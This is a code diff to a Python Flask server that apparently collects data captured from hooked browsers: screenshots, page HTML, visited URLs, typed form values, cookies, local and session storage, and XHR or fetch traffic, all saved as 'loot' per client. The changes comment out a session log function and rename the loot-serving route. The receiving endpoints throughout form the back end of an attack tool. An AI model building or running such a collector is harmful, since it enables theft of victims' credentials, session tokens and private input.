@@ -125,7 +125,7 @@ threadLock = ""
 databaseLock = ""
 
 
-logFileName = "sessionLog.txt"
+# logFileName = "sessionLog.txt"
 
 
 
@@ -477,17 +477,17 @@ class User(UserMixin, db.Model):
 
 # Thread safe raw data logging
 # Could put database stuff here...
-def logEvent(identifier, logString):
-    threadLock.acquire()
-    # print("++ Start logEvent")
-    lootPath = dataDirectory + 'lootFiles/client_' + str(SessionDirectories[identifier])
+# def logEvent(identifier, logString):
+#     threadLock.acquire()
+#     # print("++ Start logEvent")
+#     lootPath = dataDirectory + 'lootFiles/client_' + str(SessionDirectories[identifier])
 
-    # We're going to append to the logfile
-    sessionFile = open(lootPath + "/" + logFileName, "a")
-    #print("In logEvent with time: " + str(time.localtime(time.time())))
-    sessionFile.write(str(time.time()) + ": " + logString + "\n")
-    sessionFile.close()
-    threadLock.release()
+#     # We're going to append to the logfile
+#     sessionFile = open(lootPath + "/" + logFileName, "a")
+#     #print("In logEvent with time: " + str(time.localtime(time.time())))
+#     sessionFile.write(str(time.time()) + ": " + logString + "\n")
+#     sessionFile.close()
+#     threadLock.release()
     # print("-- End logEvent")
 
 
@@ -690,7 +690,7 @@ def sendIndex():
 
 # Serve up loot files
 # for images and HTML code
-@app.route('/loot/<path:path>')
+@app.route('/lootFiles/<path:path>')
 @login_required
 def sendLootFile(path):
 
@@ -818,10 +818,10 @@ def returnUUID(tag=''):
     if not os.path.exists(lootPath):
         #print("Creating directory...")
         os.mkdir(lootPath)
-        sessionFile = open(lootPath + "/" + logFileName, "w")
-        sessionFile.write("Session identifier: ")
-        sessionFile.write(token + "\n")
-        sessionFile.close()
+        # sessionFile = open(lootPath + "/" + logFileName, "w")
+        # sessionFile.write("Session identifier: ")
+        # sessionFile.write(token + "\n")
+        # sessionFile.close()
 
         # Record the client index
         clientFile = open(dataDirectory + "lootFiles/clients.txt", "a")
@@ -929,12 +929,12 @@ def recordScreenshot(identifier):
 
     #print("Writing the file to disk...")
     with open (dataDirectory + "lootFiles/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png", "wb") as binary_file:
-        logEvent(identifier, "Screenshot: " + str(imageNumber) + "_Screenshot.png")
+        # logEvent(identifier, "Screenshot: " + str(imageNumber) + "_Screenshot.png")
         binary_file.write(image)
         binary_file.close()
 
     # Put it in the DB
-    newScreenshot = Screenshot(clientID=identifier, fileName="./loot/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png")
+    newScreenshot = Screenshot(clientID=identifier, fileName="./lootFiles/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png")
     db.session.add(newScreenshot)
 
     if (proxyMode):
@@ -982,7 +982,7 @@ def recordHTML(identifier):
     lootFile = dataDirectory + "lootFiles/" + lootDir + "/" + str(htmlNumber) + "_htmlCopy.html"
 
     with open (lootFile, "w") as html_file:
-        logEvent(identifier, "HTML Copy: " + str(htmlNumber) + "_htmlCopy.html")
+        # logEvent(identifier, "HTML Copy: " + str(htmlNumber) + "_htmlCopy.html")
         html_file.write(trapHTML)
         html_file.close()
 
@@ -1026,7 +1026,7 @@ def recordUrl(identifier):
     content = request.json
     url = content['url']
     # print("Got URL: " + url)
-    logEvent(identifier, "URL Visited: " + url)
+    # logEvent(identifier, "URL Visited: " + url)
 
     # Put it in the DB
     newUrl = UrlVisited(clientID=identifier, url=content['url'])
@@ -1064,7 +1064,7 @@ def recordInput(identifier):
     inputName = content['inputName']
     inputValue = content['inputValue']
     # print("Got input: " + inputName + ", value: " + inputValue)
-    logEvent(identifier, "User input field: " + inputName + ", value: " + inputValue)
+    # logEvent(identifier, "User input field: " + inputName + ", value: " + inputValue)
 
 
     # Put it in the DB
@@ -1104,7 +1104,7 @@ def recordCookie(identifier):
     cookieName = content['cookieName']
     cookieValue = content['cookieValue']
     # print("Cookie name: " + content['cookieName'] + ", value: " + content['cookieValue'])
-    logEvent(identifier, "Cookie Name: " + cookieName + ", value: " + cookieValue)
+    # logEvent(identifier, "Cookie Name: " + cookieName + ", value: " + cookieValue)
 
 
     # Put it in the DB
@@ -1142,7 +1142,7 @@ def recordLocalStorageEntry(identifier):
     content = request.json
     localStorageKey = content['key']
     localStorageValue = content['value']
-    logEvent(identifier, "Local Storage Entry: " + localStorageKey + ", value: " + localStorageValue)
+    # logEvent(identifier, "Local Storage Entry: " + localStorageKey + ", value: " + localStorageValue)
 
 
     # Put it in the DB
@@ -1179,7 +1179,7 @@ def recordSessionStorageEntry(identifier):
     content = request.json 
     sessionStorageKey   = content['key']
     sessionStorageValue = content['value']
-    logEvent(identifier, "Session Storage Entry: " + sessionStorageKey + ", value: " + sessionStorageValue)
+    # logEvent(identifier, "Session Storage Entry: " + sessionStorageKey + ", value: " + sessionStorageValue)
 
     # Put it in the DB
     newSessionStorage = SessionStorage(clientID=identifier, key=sessionStorageKey, value=sessionStorageValue)
@@ -1216,7 +1216,7 @@ def recordXhrOpen(identifier):
     content = request.json 
     method  = content['method']
     url     = content['url']
-    logEvent(identifier, "XHR Open: " + method + ", " + url)
+    # logEvent(identifier, "XHR Open: " + method + ", " + url)
 
     # Put it in the database
     newXhrOpen = XhrOpen(clientID=identifier, method=method, url=url)
@@ -1251,7 +1251,7 @@ def recordXhrHeader(identifier):
     content = request.json 
     header  = content['header']
     value   = content['value']
-    logEvent(identifier, "XHR Set Header: " + header + ", " + value)
+    # logEvent(identifier, "XHR Set Header: " + header + ", " + value)
 
     # Put it in the database
     newXhrHeader = XhrSetHeader(clientID=identifier, header=header, value=value)
@@ -1286,7 +1286,7 @@ def recordXhrCall(identifier):
     content      = request.json 
     requestBody  = content['requestBody']
     responseBody = content['responseBody']
-    logEvent(identifier, "XHR API Call: " + requestBody + ", " + responseBody)
+    # logEvent(identifier, "XHR API Call: " + requestBody + ", " + responseBody)
 
     # Put it in the database
     newXhrCall = XhrCall(clientID=identifier, requestBody=requestBody, responseBody=responseBody)
@@ -1321,7 +1321,7 @@ def recordFetchSetup(identifier):
     content = request.json 
     method  = content['method']
     url     = content['url']
-    logEvent(identifier, "Fetch Setup: " + method + ", " + url)
+    # logEvent(identifier, "Fetch Setup: " + method + ", " + url)
 
     # Put it in the database
     newFetchSetup = FetchSetup(clientID=identifier, method=method, url=url)
@@ -1357,7 +1357,7 @@ def recordFetchHeader(identifier):
     content = request.json 
     header  = content['header']
     value   = content['value']
-    logEvent(identifier, "Fetch Header: " + header + ", " + value)
+    # logEvent(identifier, "Fetch Header: " + header + ", " + value)
 
     # Put it in the database
     newFetchHeader = FetchHeader(clientID=identifier, header=header, value=value)
@@ -1391,7 +1391,7 @@ def recordFetchCall(identifier):
     content      = request.json 
     requestBody  = content['requestBody']
     responseBody = content['responseBody']
-    logEvent(identifier, "Fetch API Call: " + requestBody + ", " + responseBody)
+    # logEvent(identifier, "Fetch API Call: " + requestBody + ", " + responseBody)
 
     # Put it in the database
     newFetchCall = FetchCall(clientID=identifier, requestBody=requestBody, responseBody=responseBody)
